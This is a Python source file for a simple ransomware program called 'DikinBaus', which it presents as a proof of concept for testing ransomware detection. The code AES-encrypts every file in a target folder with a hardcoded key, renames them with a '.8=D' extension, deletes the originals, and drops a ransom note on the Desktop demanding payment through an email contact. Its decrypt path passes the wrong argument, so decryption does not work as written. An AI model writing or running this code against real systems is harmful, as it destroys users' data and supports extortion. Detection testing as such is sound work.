import argparse
import os
import sys
import textwrap
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def parse(argv: list) -> None:
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=textwrap.dedent('''\
          ___                       _____ \n\
         / _ \ ______ ______ ______|  __ \ \n\
        | (_) |______|______|______| |  | | \n\
         > _ < ______ ______ ______| |  | | \n\
        | (_) |______|______|______| |__| | \n\
         \___/                     |_____/'''),
        epilog='DikinBaus is a trivial, PoC malware for testing ransomware BIOCs.',
        )
    parser.add_argument('-e', '--encrypt', type=str, 
                        help='encrypts a target file or folder')
    parser.add_argument('-d', '--decrypt', type=str, 
                        help='encrypts a target file or folder')
    
    #parse args
    try:
        args = parser.parse_args()
    except argparse.ArgumentError:
        sys.exit(argparse.ArgumentError)

    #run en/decryption
    if args.encrypt:
        crypt(args.encrypt, encrypt=True)
    elif args.decrypt:
        crypt(args.encrypt, encrypt=False)


def crypt(fp: str, encrypt=True) -> None:
    key = b'DikinBaus 8===D~'
    cipher = AES.new(key, AES.MODE_ECB)

    #Enumerate files as [path, contents, encoding, cipher]
    contents = []
    if os.path.isdir(fp) or os.path.isfile(fp):
        for f in os.scandir(fp):
            contents.append([f.path, open(f.path,'rb').read(), open(f.path,'r').encoding, ''])
            if encrypt:
                contents[-1][-1] = cipher.encrypt(pad(contents[-1][1], 16))
            else:
                contents[-1][-1] = unpad(cipher.decrypt(contents[-1][1]), 16)

    #Modify file structure
    for file in contents:
        if(encrypt):
            #write .DikinBaus files
            with open(file[0]+'.8=D','wb') as f:
                f.write(file[3])
            #delete original files
            os.remove(file[0])
        else:
            with open(file[0].replace('.8=D',''),'wb') as f:
                f.write(file[3])
            #delete original files
            os.remove(file[0])
    
    drop_note()

def drop_note() -> None:
    with open(os.path.expanduser('~/Desktop/Dikinbaus Ransomware.txt'), 'w') as f:
        f.write(note)

note = textwrap.dedent('''\
 .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.  .----------------.  .----------------.  .----------------. \n \
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. | \n \
| |  ________    | || |     _____    | || |  ___  ____   | || |     _____    | || | ____  _____  | || |   ______     | || |      __      | || | _____  _____ | || |    _______   | | \n \
| | |_   ___ `.  | || |    |_   _|   | || | |_  ||_  _|  | || |    |_   _|   | || ||_   \|_   _| | || |  |_   _ \    | || |     /  \     | || ||_   _||_   _|| || |   /  ___  |  | | \n \
| |   | |   `. \ | || |      | |     | || |   | |_/ /    | || |      | |     | || |  |   \ | |   | || |    | |_) |   | || |    / /\ \    | || |  | |    | |  | || |  |  (__ \_|  | | \n \
| |   | |    | | | || |      | |     | || |   |  __'.    | || |      | |     | || |  | |\ \| |   | || |    |  __'.   | || |   / ____ \   | || |  | '    ' |  | || |   '.___`-.   | | \n \
| |  _| |___.' / | || |     _| |_    | || |  _| |  \ \_  | || |     _| |_    | || | _| |_\   |_  | || |   _| |__) |  | || | _/ /    \ \_ | || |   \ `--' /   | || |  |`\____) |  | | \n \
| | |________.'  | || |    |_____|   | || | |____||____| | || |    |_____|   | || ||_____|\____| | || |  |_______/   | || ||____|  |____|| || |    `.__.'    | || |  |_______.'  | | \n \
| |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | | \n \
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' | \n \
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  \n\n\
Oh, hello there, my unwitting minions! It is I, Professor Chaos, your delightful tormentor! I have infiltrated your pitiful digital realm with a devious creation I call \"Dikinbaus Ransomware.\" \n\n\
As the custodian of your precious data, I shall unleash chaos upon your files. They are now under my wicked control, and I demand a ransom to release them from their digital prison. \n\n\
You have 72 hours to obey my commands or face the eternal loss of your cherished files! Pay the ransom promptly, and you may be spared from my relentless wrath. \n\n\
To obtain the instructions for ransom payment, send an email to professor_chaos@evilmail.com. Do not attempt to deceive me, for I am the master of deception! \n\n\
Your precious files shall remain encrypted until your obedience is confirmed. Resistance is futile. I am watching your every move! \n\n\
Remember, you may tremble, you may despair, but you shall never escape Professor Chaos! \n\n\
Bwahahaha! \n\n\
\t\--Professor Chaos''')

if __name__ == '__main__':
    parse(sys.argv[1:])